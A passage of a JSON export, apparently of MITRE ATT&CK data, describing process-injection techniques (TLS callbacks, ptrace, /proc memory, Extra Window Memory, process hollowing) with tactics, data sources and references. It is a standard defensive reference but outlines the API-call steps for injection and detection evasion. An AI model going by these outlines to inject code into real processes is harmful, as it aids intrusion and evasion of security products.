    "technique_description": "<p>Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. <!-- raw HTML omitted --><!-- raw HTML omitted -->TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code’s legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other <a href=\"https://attack.mitre.org/techniques/T1055\">Process Injection</a> techniques such as <a href=\"https://attack.mitre.org/techniques/T1055/012\">Process Hollowing</a>.(Citation: FireEye TLS Nov 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "FireEye TLS Nov 2017",
        "url": "https://www.fireeye.com/blog/threat-research/2017/11/ursnif-variant-malicious-tls-callback-technique.html",
        "description": "Vaish, A. & Nemes, S. (2017, November 28). Newly Observed Ursnif Variant Employs Malicious TLS Callback Technique to Achieve Process Injection. Retrieved December 18, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--e49ee9d2-0d98-44ef-85e5-5d3100065744",
    "platform": "windows",
    "tid": "T1055.005",
    "technique": "Thread Local Storage",
    "tactic": "privilege-escalation",
    "datasources": "api-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. <!-- raw HTML omitted --><!-- raw HTML omitted -->TLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code’s legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other <a href=\"https://attack.mitre.org/techniques/T1055\">Process Injection</a> techniques such as <a href=\"https://attack.mitre.org/techniques/T1055/012\">Process Hollowing</a>.(Citation: FireEye TLS Nov 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "FireEye TLS Nov 2017",
        "url": "https://www.fireeye.com/blog/threat-research/2017/11/ursnif-variant-malicious-tls-callback-technique.html",
        "description": "Vaish, A. & Nemes, S. (2017, November 28). Newly Observed Ursnif Variant Employs Malicious TLS Callback Technique to Achieve Process Injection. Retrieved December 18, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ea016b56-ae0e-47fe-967a-cc0ad51af67f",
    "platform": "linux",
    "tid": "T1055.008",
    "technique": "Ptrace System Calls",
    "tactic": "defense-evasion",
    "datasources": "process-monitoring|system-calls",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. <!-- raw HTML omitted --><!-- raw HTML omitted -->Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.(Citation: PTRACE man) Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <!-- raw HTML omitted -->malloc<!-- raw HTML omitted -->) then invoking that memory with <!-- raw HTML omitted -->PTRACE_SETREGS<!-- raw HTML omitted --> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <!-- raw HTML omitted -->PTRACE_POKETEXT<!-- raw HTML omitted -->/<!-- raw HTML omitted -->PTRACE_POKEDATA<!-- raw HTML omitted -->, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018) <!-- raw HTML omitted --><!-- raw HTML omitted -->Ptrace system call injection may not be possible targeting processes with high-privileges, and on some system those that are non-child processes.(Citation: BH Linux Inject) <!-- raw HTML omitted --><!-- raw HTML omitted -->Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "PTRACE man",
        "url": "http://man7.org/linux/man-pages/man2/ptrace.2.html",
        "description": "Kerrisk, M. (2020, February 9). PTRACE(2) - Linux Programmer's Manual. Retrieved February 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Medium Ptrace JUL 2018",
        "url": "https://medium.com/@jain.sm/code-injection-in-running-process-using-ptrace-d3ea7191a4be",
        "description": "Jain, S. (2018, July 25). Code injection in running process using ptrace. Retrieved February 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "BH Linux Inject",
        "url": "https://github.com/gaffe23/linux-inject/blob/master/slides_BHArsenal2015.pdf",
        "description": "Colgan, T. (2015, August 15). Linux-Inject. Retrieved February 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ArtOfMemoryForensics",
        "url": "none",
        "description": "Ligh, M.H. et al.. (2014, July). The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GNU Acct",
        "url": "https://www.gnu.org/software/acct/",
        "description": "GNU. (2010, February 5). The GNU Accounting Utilities. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "RHEL auditd",
        "url": "https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing",
        "description": "Jahoda, M. et al.. (2017, March 14). redhat Security Guide - Chapter 7 - System Auditing. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Chokepoint preload rootkits",
        "url": "http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html",
        "description": "stderr. (2014, February 14). Detecting Userland Preload Rootkits. Retrieved December 20, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--ea016b56-ae0e-47fe-967a-cc0ad51af67f",
    "platform": "linux",
    "tid": "T1055.008",
    "technique": "Ptrace System Calls",
    "tactic": "privilege-escalation",
    "datasources": "process-monitoring|system-calls",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. <!-- raw HTML omitted --><!-- raw HTML omitted -->Ptrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values.(Citation: PTRACE man) Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <!-- raw HTML omitted -->malloc<!-- raw HTML omitted -->) then invoking that memory with <!-- raw HTML omitted -->PTRACE_SETREGS<!-- raw HTML omitted --> to set the register containing the next instruction to execute. Ptrace system call injection can also be done with <!-- raw HTML omitted -->PTRACE_POKETEXT<!-- raw HTML omitted -->/<!-- raw HTML omitted -->PTRACE_POKEDATA<!-- raw HTML omitted -->, which copy data to a specific address in the target processes’ memory (ex: the current address of the next instruction). (Citation: PTRACE man)(Citation: Medium Ptrace JUL 2018) <!-- raw HTML omitted --><!-- raw HTML omitted -->Ptrace system call injection may not be possible targeting processes with high-privileges, and on some system those that are non-child processes.(Citation: BH Linux Inject) <!-- raw HTML omitted --><!-- raw HTML omitted -->Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via ptrace system call injection may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "PTRACE man",
        "url": "http://man7.org/linux/man-pages/man2/ptrace.2.html",
        "description": "Kerrisk, M. (2020, February 9). PTRACE(2) - Linux Programmer's Manual. Retrieved February 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Medium Ptrace JUL 2018",
        "url": "https://medium.com/@jain.sm/code-injection-in-running-process-using-ptrace-d3ea7191a4be",
        "description": "Jain, S. (2018, July 25). Code injection in running process using ptrace. Retrieved February 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "BH Linux Inject",
        "url": "https://github.com/gaffe23/linux-inject/blob/master/slides_BHArsenal2015.pdf",
        "description": "Colgan, T. (2015, August 15). Linux-Inject. Retrieved February 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "ArtOfMemoryForensics",
        "url": "none",
        "description": "Ligh, M.H. et al.. (2014, July). The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GNU Acct",
        "url": "https://www.gnu.org/software/acct/",
        "description": "GNU. (2010, February 5). The GNU Accounting Utilities. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "RHEL auditd",
        "url": "https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing",
        "description": "Jahoda, M. et al.. (2017, March 14). redhat Security Guide - Chapter 7 - System Auditing. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Chokepoint preload rootkits",
        "url": "http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html",
        "description": "stderr. (2014, February 14). Detecting Userland Preload Rootkits. Retrieved December 20, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d201d4cc-214d-4a74-a1ba-b3fa09fd4591",
    "platform": "linux",
    "tid": "T1055.009",
    "technique": "Proc Memory",
    "tactic": "defense-evasion",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. <!-- raw HTML omitted --><!-- raw HTML omitted -->Proc memory injection involves enumerating the memory of a process via the /proc filesystem (<!-- raw HTML omitted -->/proc/[pid]<!-- raw HTML omitted -->) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within <!-- raw HTML omitted -->/proc/[pid]/maps<!-- raw HTML omitted --> can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux Injection)(Citation: DD Man) <!-- raw HTML omitted --><!-- raw HTML omitted -->Other techniques such as <a href=\"https://attack.mitre.org/techniques/T1574/006\">LD_PRELOAD</a> may be used to populate a target process with more available gadgets. Similar to <a href=\"https://attack.mitre.org/techniques/T1055/012\">Process Hollowing</a>, proc memory injection may target child processes (such as a backgrounded copy of sleep).(Citation: GDS Linux Injection) <!-- raw HTML omitted --><!-- raw HTML omitted -->Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "Uninformed Needle",
        "url": "http://hick.org/code/skape/papers/needle.txt",
        "description": "skape. (2003, January 19). Linux x86 run-time process manipulation. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GDS Linux Injection",
        "url": "https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html",
        "description": "McNamara, R. (2017, September 5). Linux Based Inter-Process Code Injection Without Ptrace(2). Retrieved February 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "DD Man",
        "url": "http://man7.org/linux/man-pages/man1/dd.1.html",
        "description": "Kerrisk, M. (2020, February 2). DD(1) User Commands. Retrieved February 21, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--d201d4cc-214d-4a74-a1ba-b3fa09fd4591",
    "platform": "linux",
    "tid": "T1055.009",
    "technique": "Proc Memory",
    "tactic": "privilege-escalation",
    "datasources": "file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process. <!-- raw HTML omitted --><!-- raw HTML omitted -->Proc memory injection involves enumerating the memory of a process via the /proc filesystem (<!-- raw HTML omitted -->/proc/[pid]<!-- raw HTML omitted -->) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within <!-- raw HTML omitted -->/proc/[pid]/maps<!-- raw HTML omitted --> can be overwritten using dd.(Citation: Uninformed Needle)(Citation: GDS Linux Injection)(Citation: DD Man) <!-- raw HTML omitted --><!-- raw HTML omitted -->Other techniques such as <a href=\"https://attack.mitre.org/techniques/T1574/006\">LD_PRELOAD</a> may be used to populate a target process with more available gadgets. Similar to <a href=\"https://attack.mitre.org/techniques/T1055/012\">Process Hollowing</a>, proc memory injection may target child processes (such as a backgrounded copy of sleep).(Citation: GDS Linux Injection) <!-- raw HTML omitted --><!-- raw HTML omitted -->Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "Uninformed Needle",
        "url": "http://hick.org/code/skape/papers/needle.txt",
        "description": "skape. (2003, January 19). Linux x86 run-time process manipulation. Retrieved December 20, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GDS Linux Injection",
        "url": "https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html",
        "description": "McNamara, R. (2017, September 5). Linux Based Inter-Process Code Injection Without Ptrace(2). Retrieved February 21, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "DD Man",
        "url": "http://man7.org/linux/man-pages/man1/dd.1.html",
        "description": "Kerrisk, M. (2020, February 2). DD(1) User Commands. Retrieved February 21, 2020.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298",
    "platform": "windows",
    "tid": "T1055.011",
    "technique": "Extra Window Memory Injection",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. <!-- raw HTML omitted --><!-- raw HTML omitted -->Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)<!-- raw HTML omitted --><!-- raw HTML omitted -->Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.<!-- raw HTML omitted --><!-- raw HTML omitted -->Execution granted through EWM injection may allow access to both the target process’s memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <!-- raw HTML omitted -->WriteProcessMemory<!-- raw HTML omitted --> and <!-- raw HTML omitted -->CreateRemoteThread<!-- raw HTML omitted -->.(Citation: Endgame Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)<!-- raw HTML omitted --><!-- raw HTML omitted -->Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Window Classes",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms633574.aspx",
        "description": "Microsoft. (n.d.). About Window Classes. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft GetWindowLong function",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms633584.aspx",
        "description": "Microsoft. (n.d.). GetWindowLong function. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SetWindowLong function",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms633591.aspx",
        "description": "Microsoft. (n.d.). SetWindowLong function. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "MalwareTech Power Loader Aug 2013",
        "url": "https://www.malwaretech.com/2013/08/powerloader-injection-something-truly.html",
        "description": "MalwareTech. (2013, August 13). PowerLoader Injection – Something truly amazing. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "WeLiveSecurity Gapz and Redyms Mar 2013",
        "url": "https://www.welivesecurity.com/2013/03/19/gapz-and-redyms-droppers-based-on-power-loader-code/",
        "description": "Matrosov, A. (2013, March 19). Gapz and Redyms droppers based on Power Loader code. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SendNotifyMessage function",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms644953.aspx",
        "description": "Microsoft. (n.d.). SendNotifyMessage function. Retrieved December 16, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--0042a9f5-f053-4769-b3ef-9ad018dfa298",
    "platform": "windows",
    "tid": "T1055.011",
    "technique": "Extra Window Memory Injection",
    "tactic": "privilege-escalation",
    "datasources": "api-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. <!-- raw HTML omitted --><!-- raw HTML omitted -->Before creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)<!-- raw HTML omitted --><!-- raw HTML omitted -->Although small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.<!-- raw HTML omitted --><!-- raw HTML omitted -->Execution granted through EWM injection may allow access to both the target process’s memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <!-- raw HTML omitted -->WriteProcessMemory<!-- raw HTML omitted --> and <!-- raw HTML omitted -->CreateRemoteThread<!-- raw HTML omitted -->.(Citation: Endgame Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)<!-- raw HTML omitted --><!-- raw HTML omitted -->Running code in the context of another process may allow access to the process’s memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "Microsoft Window Classes",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms633574.aspx",
        "description": "Microsoft. (n.d.). About Window Classes. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft GetWindowLong function",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms633584.aspx",
        "description": "Microsoft. (n.d.). GetWindowLong function. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SetWindowLong function",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms633591.aspx",
        "description": "Microsoft. (n.d.). SetWindowLong function. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "MalwareTech Power Loader Aug 2013",
        "url": "https://www.malwaretech.com/2013/08/powerloader-injection-something-truly.html",
        "description": "MalwareTech. (2013, August 13). PowerLoader Injection – Something truly amazing. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "WeLiveSecurity Gapz and Redyms Mar 2013",
        "url": "https://www.welivesecurity.com/2013/03/19/gapz-and-redyms-droppers-based-on-power-loader-code/",
        "description": "Matrosov, A. (2013, March 19). Gapz and Redyms droppers based on Power Loader code. Retrieved December 16, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SendNotifyMessage function",
        "url": "https://msdn.microsoft.com/library/windows/desktop/ms644953.aspx",
        "description": "Microsoft. (n.d.). SendNotifyMessage function. Retrieved December 16, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b200542e-e877-4395-875b-cf1a44537ca4",
    "platform": "windows",
    "tid": "T1055.012",
    "technique": "Process Hollowing",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  <!-- raw HTML omitted --><!-- raw HTML omitted -->Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <!-- raw HTML omitted -->CreateProcess<!-- raw HTML omitted -->, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <!-- raw HTML omitted -->ZwUnmapViewOfSection<!-- raw HTML omitted --> or <!-- raw HTML omitted -->NtUnmapViewOfSection<!-- raw HTML omitted -->  before being written to, realigned to the injected code, and resumed via <!-- raw HTML omitted -->VirtualAllocEx<!-- raw HTML omitted -->, <!-- raw HTML omitted -->WriteProcessMemory<!-- raw HTML omitted -->, <!-- raw HTML omitted -->SetThreadContext<!-- raw HTML omitted -->, then <!-- raw HTML omitted -->ResumeThread<!-- raw HTML omitted --> respectively.(Citation: Leitch Hollowing)(Citation: Endgame Process Injection July 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->This is very similar to <a href=\"https://attack.mitre.org/techniques/T1055/005\">Thread Local Storage</a> but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "Leitch Hollowing",
        "url": "http://www.autosectools.com/process-hollowing.pdf",
        "description": "Leitch, J. (n.d.). Process Hollowing. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--b200542e-e877-4395-875b-cf1a44537ca4",
    "platform": "windows",
    "tid": "T1055.012",
    "technique": "Process Hollowing",
    "tactic": "privilege-escalation",
    "datasources": "api-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
    "technique_description": "<p>Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  <!-- raw HTML omitted --><!-- raw HTML omitted -->Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <!-- raw HTML omitted -->CreateProcess<!-- raw HTML omitted -->, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <!-- raw HTML omitted -->ZwUnmapViewOfSection<!-- raw HTML omitted --> or <!-- raw HTML omitted -->NtUnmapViewOfSection<!-- raw HTML omitted -->  before being written to, realigned to the injected code, and resumed via <!-- raw HTML omitted -->VirtualAllocEx<!-- raw HTML omitted -->, <!-- raw HTML omitted -->WriteProcessMemory<!-- raw HTML omitted -->, <!-- raw HTML omitted -->SetThreadContext<!-- raw HTML omitted -->, then <!-- raw HTML omitted -->ResumeThread<!-- raw HTML omitted --> respectively.(Citation: Leitch Hollowing)(Citation: Endgame Process Injection July 2017)<!-- raw HTML omitted --><!-- raw HTML omitted -->This is very similar to <a href=\"https://attack.mitre.org/techniques/T1055/005\">Thread Local Storage</a> but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.</p>\n",
    "technique_references": [
      {
        "source_name": "Leitch Hollowing",
        "url": "http://www.autosectools.com/process-hollowing.pdf",
        "description": "Leitch, J. (n.d.). Process Hollowing. Retrieved November 12, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "Endgame Process Injection July 2017",
        "url": "https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process",
        "description": "Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.",
        "external_id": "none"
      }
    ]
  },
  {
    "id": "attack-pattern--7007935a-a8a7-4c0b-bd98-4e85be8ed197",
    "platform": "windows",
    "tid": "T1055.013",
    "technique": "Process Doppelgänging",
    "tactic": "defense-evasion",
    "datasources": "api-monitoring|file-monitoring|process-monitoring",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "none",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "none",
